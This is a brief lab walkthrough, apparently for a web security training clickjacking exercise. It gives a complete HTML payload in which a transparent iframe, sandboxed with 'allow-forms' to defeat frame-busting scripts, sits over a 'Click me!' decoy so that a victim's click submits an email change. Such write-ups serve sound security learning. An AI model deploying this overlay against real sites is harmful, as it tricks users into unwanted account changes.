First login as `wiener` user. Next, `Got to exploit server` and paste the code from the previous lab and edit the url. If you click on `View exploit` you'll see that our iframe cannot be loaded, most probably due to frame busting scripts.

![image](https://user-images.githubusercontent.com/86168235/130333149-c08d614e-9291-4e9a-b119-be278172b405.png)

We can bypass this by adding the **sandbox** attribute to our iframe and the value of the attribute to **"allow-forms"**. Paste the following code into the **Body** field in the exploit server.

```
<br>
<style>
   #iframeBlock {
       position:relative;
       width:700;
       height: 500;
       opacity: 0.0;
       z-index: 2;
   }
   #divBlock {
       position:absolute;
       color:green;
       top:478;
       left:70;
       z-index: 1;
   }
</style>
<div id="divBlock">Click me!</div>
<iframe id="iframeBlock" src="https://ac8b1fb91e67a5c3805260b000470089.web-security-academy.net/my-account?email=a@bc.net" sandbox="allow-forms"></iframe>

```

Finally, click on `Deliver exploit to victim` and the lab will be solved!
